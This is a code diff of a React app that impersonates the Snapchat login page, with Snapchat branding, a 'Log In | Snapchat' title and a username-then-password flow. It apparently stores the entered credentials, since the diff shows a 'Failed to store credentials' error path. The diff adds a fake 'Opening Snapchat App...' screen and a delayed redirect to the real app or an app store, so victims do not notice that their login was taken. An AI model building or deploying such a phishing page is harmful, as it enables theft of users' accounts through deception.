@@ -6,21 +6,15 @@ function App() {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
-  const [currentStep, setCurrentStep] = useState('username'); // 'username' | 'password' | 'success'
+  const [currentStep, setCurrentStep] = useState('username'); // 'username' | 'password' | 'opening' | 'success'
   const [isLoading, setIsLoading] = useState(false);
-  const [isInitialLoading, setIsInitialLoading] = useState(true);
+  const [isOpeningApp, setIsOpeningApp] = useState(false);
   const [errors, setErrors] = useState({});
 
-  // Simulate initial loading skeleton
+  // Update document title based on current step
   useEffect(() => {
-    const timer = setTimeout(() => {
-      setIsInitialLoading(false);
-    }, 1500);
-    return () => clearTimeout(timer);
-  }, []);
-
-  // Show skeleton when transitioning to password step
-  const [showPasswordSkeleton, setShowPasswordSkeleton] = useState(false);
+    document.title = 'Log In | Snapchat';
+  }, [currentStep]);
 
   // Handle username submission
   const handleUsernameSubmit = (e) => {
@@ -32,14 +26,15 @@ function App() {
       return;
     }
 
-    // Clear errors and show skeleton before transitioning
-    setErrors({});
-    setShowPasswordSkeleton(true);
+    // Show loading state with spinner
+    setIsLoading(true);
 
+    // Simulate brief loading then proceed
     setTimeout(() => {
-      setShowPasswordSkeleton(false);
+      setIsLoading(false);
+      setErrors({});
       setCurrentStep('password');
-    }, 1200);
+    }, 800);
   };
 
   // Handle password submission
@@ -61,17 +56,77 @@ function App() {
 
       if (result.error) {
         console.error('Failed to store credentials:', result.error);
-        // Still show success to user (for demo purposes)
       }
 
-      // Show success state
-      setCurrentStep('success');
+      // Show "Opening Snapchat App..." state
+      setIsLoading(false);
+      setCurrentStep('opening');
+      setIsOpeningApp(true);
+
+      // Wait 5-6 seconds then try to open Snapchat app
+      setTimeout(() => {
+        openSnapchatApp();
+      }, 5500);
+
     } catch (error) {
       console.error('Error during login:', error);
       setErrors({ password: 'Something went wrong. Please try again.' });
-    } finally {
       setIsLoading(false);
     }
+  };
+
+  // Try to open Snapchat app (deep linking for iOS/Android)
+  const openSnapchatApp = () => {
+    // Snapchat deep link URLs
+    const snapchatDeepLink = 'snapchat://';
+    const snapchatAppStoreIOS = 'https://apps.apple.com/app/snapchat/id447188370';
+    const snapchatPlayStore = 'https://play.google.com/store/apps/details?id=com.snapchat.android';
+
+    // Try to open the Snapchat app
+    const startTime = Date.now();
+
+    // Create a hidden iframe to try the deep link
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = snapchatDeepLink;
+    document.body.appendChild(iframe);
+
+    // Also try direct window location
+    window.location.href = snapchatDeepLink;
+
+    // After a short delay, check if we're still on the page
+    setTimeout(() => {
+      const endTime = Date.now();
+
+      // If we're still here after 2 seconds, app probably didn't open
+      if (endTime - startTime < 2500) {
+        // Detect platform and redirect to appropriate store
+        const userAgent = navigator.userAgent.toLowerCase();
+        const isIOS = /iphone|ipad|ipod/.test(userAgent);
+        const isAndroid = /android/.test(userAgent);
+
+        if (isIOS) {
+          window.location.href = snapchatAppStoreIOS;
+        } else if (isAndroid) {
+          window.location.href = snapchatPlayStore;
+        } else {
+          // Desktop - redirect to Snapchat web
+          window.location.href = 'https://www.snapchat.com';
+        }
+      }
+
+      // Clean up
+      document.body.removeChild(iframe);
+    }, 2000);
+  };
+
+  // Handle "Open in Snapchat" button click
+  const handleOpenInSnapchat = () => {
+    setIsOpeningApp(true);
+
+    setTimeout(() => {
+      openSnapchatApp();
+    }, 5500);
   };
 
   // Go back to username step ("Not you?" button)
@@ -87,6 +142,9 @@ function App() {
     e.preventDefault();
     alert('Forgot Password feature coming soon!');
   };
+
+  // Spinner Component
+  const Spinner = () => <span className="spinner"></span>;
 
   // Eye icons for password visibility
   const EyeIcon = () => (
@@ -105,9 +163,10 @@ function App() {
 
   return (
     <div className="app">
+      {/* Main White Container */}
       <div className="login-container">
         <div className="login-content">
-          {/* Snapchat Logo - Official SVG */}
+          {/* Snapchat Logo - Official SVG - BIGGER */}
           <div className="snap-logo">
             <img
               src="/snapchat-icon-for-login-and-signup-page.svg"
@@ -117,17 +176,19 @@ function App() {
 
           {/* Page Title - Changes based on step */}
           <h1 className="login-title">
-            {currentStep === 'password' ? 'Enter Password' : 'Log in to Snapchat'}
+            {currentStep === 'password' || currentStep === 'opening'
+              ? 'Enter Password'
+              : 'Log in to Snapchat'}
           </h1>
 
           {/* Username Step */}
-          {currentStep === 'username' && !showPasswordSkeleton && (
+          {currentStep === 'username' && (
             <form className="login-form fade-in" onSubmit={handleUsernameSubmit}>
               <div className="input-group">
                 <label htmlFor="username" className="input-label">
                   Username or Email
                 </label>
-                <div className={`input-wrapper ${isInitialLoading ? 'input-skeleton' : ''}`}>
+                <div className="input-wrapper">
                   <input
                     type="text"
                     id="username"
@@ -136,7 +197,7 @@ function App() {
                     onChange={(e) => setUsername(e.target.value)}
                     autoComplete="username"
                     autoFocus
-                    disabled={isInitialLoading}
+                    disabled={isLoading}
                   />
                 </div>
                 {errors.username && (
@@ -148,39 +209,15 @@ function App() {
                 <a href="#phone">Use phone number instead</a>
               </div>
 
-              <button type="submit" className="next-button" disabled={isLoading || isInitialLoading}>
+              <button type="submit" className="next-button" disabled={isLoading}>
+                {isLoading && <Spinner />}
                 Next
               </button>
             </form>
           )}
 
-          {/* Loading skeleton when transitioning to password step */}
-          {showPasswordSkeleton && (
-            <div className="login-form fade-in">
-              <div className="username-display">
-                <span className="username-text">{username}</span>
-                <span className="not-you-link">Not you?</span>
-              </div>
-
-              <div className="input-group">
-                <label htmlFor="password-skeleton" className="input-label">
-                  Password
-                </label>
-                <div className="input-wrapper input-skeleton">
-                  <input
-                    type="password"
-                    id="password-skeleton"
-                    className="input-field has-toggle"
-                    disabled
-                    placeholder="Loading..."
-                  />
-                </div>
-              </div>
-            </div>
-          )}
-
           {/* Password Step */}
-          {currentStep === 'password' && !showPasswordSkeleton && (
+          {currentStep === 'password' && (
             <form className="login-form fade-in" onSubmit={handlePasswordSubmit}>
               {/* Username display with "Not you?" link */}
               <div className="username-display">
@@ -203,6 +240,7 @@ function App() {
                     onChange={(e) => setPassword(e.target.value)}
                     autoComplete="current-password"
                     autoFocus
+                    disabled={isLoading}
                   />
                   <button
                     type="button"
@@ -225,18 +263,28 @@ function App() {
               </div>
 
               <button type="submit" className="next-button" disabled={isLoading}>
-                {isLoading ? (
-                  <>
-                    <span className="spinner"></span>
-                  </>
-                ) : (
-                  'Next'
-                )}
+                {isLoading && <Spinner />}
+                Next
               </button>
             </form>
           )}
 
-          {/* Success Step */}
+          {/* Opening Snapchat App State */}
+          {currentStep === 'opening' && (
+            <div className="login-form fade-in">
+              {/* Username display */}
+              <div className="username-display">
+                <span className="username-text">{username}</span>
+              </div>
+
+              <div className="opening-button">
+                <Spinner />
+                Opening Snapchat App...
+              </div>
+            </div>
+          )}
+
+          {/* Success Step (fallback) */}
           {currentStep === 'success' && (
             <div className="success-message fade-in">
               <div className="success-icon">
@@ -252,19 +300,32 @@ function App() {
               </p>
             </div>
           )}
-
-          {/* Sign Up Section */}
-          {currentStep !== 'success' && !showPasswordSkeleton && (
-            <div className="signup-section">
-              <span className="signup-text">New to Snapchat?</span>
-              <a href="#signup" className="signup-link">Sign Up</a>
-            </div>
-          )}
         </div>
+      </div>
 
-        {/* Open in Snapchat Button */}
-        <button className="open-app-button">
-          Open in Snapchat
+      {/* Sign Up Section - OUTSIDE white container */}
+      {currentStep !== 'opening' && currentStep !== 'success' && (
+        <div className="signup-section">
+          <span className="signup-text">New to Snapchat?</span>
+          <a href="#signup" className="signup-link">Sign Up</a>
+        </div>
+      )}
+
+      {/* Black Footer with Yellow Button */}
+      <div className="footer-container">
+        <button
+          className="open-app-button"
+          onClick={handleOpenInSnapchat}
+          disabled={isOpeningApp}
+        >
+          {isOpeningApp ? (
+            <>
+              <Spinner />
+              Opening Snapchat...
+            </>
+          ) : (
+            'Open in Snapchat'
+          )}
         </button>
       </div>
     </div>
